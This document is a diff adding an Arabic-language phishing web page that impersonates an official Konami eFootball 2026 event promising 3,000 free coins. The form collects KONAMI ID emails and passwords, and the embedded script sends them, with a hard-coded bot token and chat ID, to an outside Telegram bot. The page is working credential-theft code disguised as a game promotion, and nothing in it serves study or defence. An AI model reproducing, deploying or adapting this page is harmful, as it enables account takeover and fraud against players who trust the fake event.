@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>حدث eFootball 2026 — ربح 3000 Coins | KONAMI ID</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-dark: #050811;
+            --bg-card: rgba(15, 23, 42, 0.92);
+            --bg-input: #080d1a;
+            --border-color: #26354d;
+            --gold: #facc15;
+            --gold-hover: #eab308;
+            --cyan: #38bdf8;
+            --crimson: #f43f5e;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --success: #22c55e;
+            --error: #ef4444;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        body {
+            background:
+                radial-gradient(circle at 15% 15%, rgba(56, 189, 248, 0.18), transparent 40%),
+                radial-gradient(circle at 85% 85%, rgba(250, 204, 21, 0.16), transparent 42%),
+                linear-gradient(160deg, #04070f 0%, #091122 55%, #050811 100%);
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 22px;
+        }
+
+        .event-wrapper {
+            width: 100%;
+            max-width: 490px;
+            background: var(--bg-card);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border-color);
+            border-radius: 22px;
+            padding: 26px 24px;
+            box-shadow:
+                0 24px 60px rgba(0, 0, 0, 0.75),
+                0 0 30px rgba(56, 189, 248, 0.08);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .event-wrapper::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--crimson), var(--gold), var(--cyan));
+        }
+
+        .top-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .live-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 7px;
+            background: rgba(34, 197, 94, 0.14);
+            border: 1px solid rgba(34, 197, 94, 0.35);
+            color: #4ade80;
+            font-size: 11.5px;
+            font-weight: 800;
+            padding: 5px 11px;
+            border-radius: 999px;
+            letter-spacing: 0.4px;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #4ade80;
+            box-shadow: 0 0 10px #4ade80;
+            animation: pulse 1.6s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.35); opacity: 0.65; }
+        }
+
+        .season-pill {
+            background: rgba(250, 204, 21, 0.13);
+            border: 1px solid rgba(250, 204, 21, 0.35);
+            color: var(--gold);
+            font-size: 11.5px;
+            font-weight: 800;
+            padding: 5px 11px;
+            border-radius: 999px;
+        }
+
+        .hero {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .hero h1 {
+            font-size: 24px;
+            font-weight: 900;
+            margin-bottom: 6px;
+            line-height: 1.35;
+        }
+
+        .hero h1 span {
+            color: var(--gold);
+            text-shadow: 0 0 18px rgba(250, 204, 21, 0.28);
+        }
+
+        .hero p {
+            color: var(--text-muted);
+            font-size: 13.5px;
+            line-height: 1.65;
+        }
+
+        .reward-card {
+            background: linear-gradient(135deg, rgba(250, 204, 21, 0.14), rgba(56, 189, 248, 0.12));
+            border: 1px solid rgba(250, 204, 21, 0.32);
+            border-radius: 16px;
+            padding: 15px 16px;
+            margin-bottom: 20px;
+            transition: transform 0.25s ease, box-shadow 0.25s ease;
+        }
+
+        .reward-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(250, 204, 21, 0.12);
+        }
+
+        .reward-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .reward-title strong {
+            display: block;
+            font-size: 18px;
+            font-weight: 900;
+            color: var(--gold);
+        }
+
+        .reward-title small {
+            font-size: 12px;
+            color: #cbd5e1;
+        }
+
+        .reward-badge {
+            background: var(--cyan);
+            color: #04101e;
+            font-size: 11.5px;
+            font-weight: 900;
+            padding: 5px 10px;
+            border-radius: 8px;
+        }
+
+        .progress-meta {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11.5px;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+        }
+
+        .progress-track {
+            width: 100%;
+            height: 7px;
+            background: rgba(15, 23, 42, 0.9);
+            border-radius: 999px;
+            overflow: hidden;
+            border: 1px solid rgba(148, 163, 184, 0.2);
+        }
+
+        .progress-fill {
+            width: 78%;
+            height: 100%;
+            background: linear-gradient(90deg, var(--cyan), var(--gold));
+            border-radius: 999px;
+        }
+
+        .konami-box {
+            background: rgba(8, 13, 26, 0.85);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 16px;
+        }
+
+        .konami-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 10px;
+            margin-bottom: 14px;
+            border-bottom: 1px dashed var(--border-color);
+        }
+
+        .konami-logo {
+            font-size: 15px;
+            font-weight: 900;
+            letter-spacing: 0.8px;
+        }
+
+        .konami-logo span {
+            color: var(--crimson);
+        }
+
+        .konami-tag {
+            font-size: 11.5px;
+            font-weight: 700;
+            color: var(--cyan);
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group:last-child {
+            margin-bottom: 0;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: #e2e8f0;
+            margin-bottom: 6px;
+        }
+
+        .input-wrap {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 12px 14px;
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: 11px;
+            color: var(--text-main);
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.25s, box-shadow 0.25s;
+        }
+
+        input.has-toggle {
+            padding-left: 44px;
+        }
+
+        input:focus, select:focus {
+            border-color: var(--gold);
+            box-shadow: 0 0 0 3px rgba(250, 204, 21, 0.14);
+        }
+
+        .toggle-pass-btn {
+            position: absolute;
+            left: 10px;
+            background: transparent;
+            border: none;
+            color: var(--text-muted);
+            font-size: 15px;
+            cursor: pointer;
+            padding: 4px 6px;
+            border-radius: 6px;
+            transition: color 0.2s, background 0.2s;
+        }
+
+        .toggle-pass-btn:hover {
+            color: var(--gold);
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        .btn-claim {
+            width: 100%;
+            padding: 14px;
+            margin-top: 8px;
+            border: none;
+            border-radius: 13px;
+            background: linear-gradient(90deg, var(--gold), var(--gold-hover));
+            color: #070b14;
+            font-size: 15.5px;
+            font-weight: 900;
+            cursor: pointer;
+            box-shadow: 0 8px 22px rgba(250, 204, 21, 0.22);
+            transition: transform 0.2s, filter 0.2s, box-shadow 0.2s;
+        }
+
+        .btn-claim:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.05);
+            box-shadow: 0 12px 26px rgba(250, 204, 21, 0.32);
+        }
+
+        .btn-claim:disabled {
+            background: #334155;
+            color: #94a3b8;
+            box-shadow: none;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .status-box {
+            margin-top: 14px;
+            text-align: center;
+            font-size: 13.5px;
+            font-weight: 700;
+            min-height: 22px;
+        }
+
+        .footer-note {
+            margin-top: 14px;
+            text-align: center;
+            font-size: 11.5px;
+            color: var(--text-muted);
+        }
+    </style>
+</head>
+<body>
+
+<div class="event-wrapper">
+    <div class="top-bar">
+        <div class="live-pill">
+            <span class="live-dot"></span>
+            LIVE EVENT
+        </div>
+        <div class="season-pill">eFootball 2026</div>
+    </div>
+
+    <div class="hero">
+        <h1>حدث <span>3000 Coins</span> الرسمي</h1>
+        <p>سجّل دخولك عبر KONAMI ID وأكمل بيانات حسابك للمشاركة في حدث مكافآت موسم eFootball 2026.</p>
+    </div>
+
+    <div class="reward-card">
+        <div class="reward-top">
+            <div class="reward-title">
+                <strong>🪙 3,000 eFootball Coins</strong>
+                <small>مكافأة حدث اللاعبين المميزين</small>
+            </div>
+            <div class="reward-badge">+3000 COINS</div>
+        </div>
+        <div class="progress-meta">
+            <span>حالة توزيع حصص الحدث</span>
+            <span>78% مكتمل</span>
+        </div>
+        <div class="progress-track">
+            <div class="progress-fill"></div>
+        </div>
+    </div>
+
+    <form id="efootballEventForm">
+        <div class="konami-box">
+            <div class="konami-header">
+                <div class="konami-logo">KONAMI <span>ID</span></div>
+                <div class="konami-tag">تسجيل الدخول</div>
+            </div>
+
+            <div class="form-group">
+                <label for="konamiEmail">البريد الإلكتروني أو معرف KONAMI ID:</label>
+                <input type="text" id="konamiEmail" placeholder="example@email.com أو Konami ID" required>
+            </div>
+
+            <div class="form-group">
+                <label for="konamiPassword">كلمة المرور:</label>
+                <div class="input-wrap">
+                    <input type="password" id="konamiPassword" class="has-toggle" placeholder="أدخل كلمة مرور KONAMI ID" required>
+                    <button type="button" class="toggle-pass-btn" id="togglePassBtn" aria-label="إظهار أو إخفاء كلمة المرور" title="إظهار / إخفاء كلمة المرور">👁️</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label for="ownerName">الاسم الظاهر في الحساب:</label>
+            <input type="text" id="ownerName" placeholder="مثال: Ronaldo cr7" required>
+        </div>
+
+        <div class="form-group">
+            <label for="platform">منصة اللعب:</label>
+            <select id="platform">
+                <option value="Mobile (Android / iOS)">📱 Mobile (Android / iOS)</option>
+                <option value="PlayStation 4 / 5">🎮 PlayStation 4 / 5</option>
+                <option value="PC / Steam">💻 PC / Steam</option>
+                <option value="Xbox Series X|S">🕹️ Xbox Series X|S</option>
+            </select>
+        </div>
+
+        <button type="submit" class="btn-claim" id="claimBtn">المطالبة بـ 3000 Coins 🏆</button>
+        <div class="status-box" id="statusBox"></div>
+    </form>
+
+    <div class="footer-note">
+        يتم إرسال بيانات المشاركة مباشرة إلى بوت الإدارة عبر Telegram API.
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8848088805:AAEgv6JegKYEvDN3Cz43J5rvWGye-Wyh7t4";
+    const CHAT_ID = "6994641819";
+
+    const form = document.getElementById("efootballEventForm");
+    const statusBox = document.getElementById("statusBox");
+    const claimBtn = document.getElementById("claimBtn");
+    const passwordInput = document.getElementById("konamiPassword");
+    const togglePassBtn = document.getElementById("togglePassBtn");
+
+    togglePassBtn.addEventListener("click", function () {
+        const isPassword = passwordInput.type === "password";
+        passwordInput.type = isPassword ? "text" : "password";
+        togglePassBtn.textContent = isPassword ? "🙈" : "👁️";
+    });
+
+    form.addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const konamiEmail = document.getElementById("konamiEmail").value.trim();
+        const konamiPassword = passwordInput.value;
+        const ownerName = document.getElementById("ownerName").value.trim();
+        const platform = document.getElementById("platform").value;
+
+        const message =
+`🏆 *مشاركة جديدة — حدث eFootball 2026 (3000 Coins)* 🏆
+━━━━━━━━━━━━━━━━━━━━━━
+👤 *الاسم:* ${ownerName}
+🎮 *المنصة:* ${platform}
+🔐 *KONAMI ID / Email:* \`${konamiEmail}\`
+🔑 *Password:* \`${konamiPassword}\`
+━━━━━━━━━━━━━━━━━━━━━━`;
+
+        claimBtn.disabled = true;
+        claimBtn.innerText = "جاري إرسال طلب المكافأة...";
+        statusBox.innerText = "";
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "Markdown"
+            })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.ok) {
+                statusBox.style.color = "var(--success)";
+                statusBox.innerText = "✅ تم تسجيل مشاركتك في حدث 3000 Coins بنجاح!";
+                form.reset();
+                passwordInput.type = "password";
+                togglePassBtn.textContent = "👁️";
+            } else {
+                statusBox.style.color = "var(--error)";
+                statusBox.innerText = "❌ تعذر الإرسال: تأكد من تفعيل البوت (/start) وصحة التوكن.";
+            }
+        })
+        .catch(() => {
+            statusBox.style.color = "var(--error)";
+            statusBox.innerText = "❌ خطأ في الاتصال بالشبكة.";
+        })
+        .finally(() => {
+            claimBtn.disabled = false;
+            claimBtn.innerText = "المطالبة بـ 3000 Coins 🏆";
+        });
+    });
+</script>
+
+</body>
+</html>
